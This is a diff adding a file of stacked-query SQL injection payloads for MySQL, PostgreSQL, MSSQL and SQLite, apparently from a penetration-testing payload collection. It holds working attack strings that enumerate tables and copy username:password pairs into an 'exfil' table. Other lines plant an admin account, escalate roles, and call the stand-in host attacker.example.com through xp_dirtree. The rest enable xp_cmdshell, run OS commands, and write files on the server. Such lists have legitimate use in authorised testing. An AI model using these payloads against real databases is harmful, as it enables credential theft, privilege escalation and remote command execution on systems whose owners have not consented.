@@ -1,0 +1,58 @@
+# ============================================================
+# SQL Injection Payloads - Stacked Queries
+# ============================================================
+# Target: Backends that allow multiple SQL statements separated
+#   by semicolons. Common in MSSQL and PostgreSQL.
+#   MySQL supports it via multi-query APIs. SQLite supports it.
+#
+# WARNING: Stacked queries can modify/destroy data. Use only on
+#   test systems you control.
+# ============================================================
+
+# --- Confirm stacked query support ---
+'; SELECT 1 --
+'; SELECT NULL --
+
+# --- Information gathering ---
+# MySQL
+'; SELECT @@version --
+'; SELECT database() --
+'; SELECT table_name FROM information_schema.tables WHERE table_schema=database() --
+
+# PostgreSQL
+'; SELECT version() --
+'; SELECT current_database() --
+
+# MSSQL
+'; SELECT @@version --
+'; SELECT DB_NAME() --
+
+# SQLite
+'; SELECT sqlite_version() --
+'; SELECT name FROM sqlite_master WHERE type='table' --
+
+# --- Data extraction via INSERT into attacker-controlled table ---
+# (If you can create tables or insert into existing ones)
+'; CREATE TABLE exfil(data TEXT) --
+'; INSERT INTO exfil SELECT username||':'||password FROM users --
+
+# --- Add admin user (test environments only) ---
+'; INSERT INTO users(username,password,role) VALUES('testadmin','testpass','admin') --
+
+# --- Modify data (test environments only) ---
+'; UPDATE users SET role='admin' WHERE username='testuser' --
+
+# --- DNS/HTTP exfiltration (MSSQL) ---
+# Requires outbound network access from the DB server
+'; EXEC master..xp_dirtree '\\attacker.example.com\share' --
+
+# --- Enable xp_cmdshell (MSSQL, test environments only) ---
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE --
+'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE --
+'; EXEC xp_cmdshell 'whoami' --
+
+# --- PostgreSQL command execution (test environments only) ---
+'; COPY (SELECT '') TO PROGRAM 'id' --
+
+# --- Out-of-band via file write (MySQL, test environments only) ---
+'; SELECT 'test' INTO OUTFILE '/tmp/sqli_test.txt' --
